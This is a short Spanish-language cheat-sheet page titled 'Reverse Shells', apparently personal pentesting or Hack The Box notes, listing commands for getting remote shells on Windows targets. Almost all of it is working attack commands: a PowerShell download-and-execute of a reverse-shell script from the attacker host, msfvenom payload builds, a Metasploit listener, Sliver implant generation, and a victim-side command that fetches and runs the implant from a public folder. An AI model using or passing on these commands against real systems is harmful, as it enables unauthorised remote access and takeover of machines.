---
title: Reverse Shells
layout: default
---


### **Windows**

```powershell
IEX (New-Object Net.WebClient).DownloadString('http://LHOST:LPORT/Invoke-PowerShellTcp.ps1')
```

La mejor (a poder ser, es mejor ejecutarla desde el principio así):

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=LHOST LPORT=LPORT -f exe -o revShell.exe

powershell -c "Invoke-webrequest http://$lhost:$py_http_srv_port/$revshell_name -outfile $revshell_name"
. ./revShell.exe
```

```bash
use exploit/multi/handler; set lhost LHOST; set lport LPORT; run
```

# x64

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=LHOST LPORT=LPORT -f exe -o revShell.exe
```
# x86

```bash
msfvenom -a x86 -p windows/shell_reverse_tcp LHOST=IP LPORT=PORT -f exe -o revShell.exe
```

# Sliver

```bash
curl https://sliver.sh/install|sudo bash sliver
sliver
```

```bash
generate --os windows --arch 64bit --mtls IP-ATACANTE --reconnect 60 --save htb.exe 

mtls
```

```bash
sudo python3 -m http.server 80
```

En la víctima:
```powershell
powershell -c "wget IP-ATACANTE/htb.exe -usebasiparsing -outfile C:\users\public\music\htb.exe; C:\users\public\music\htb.exe"
```

```
upload
```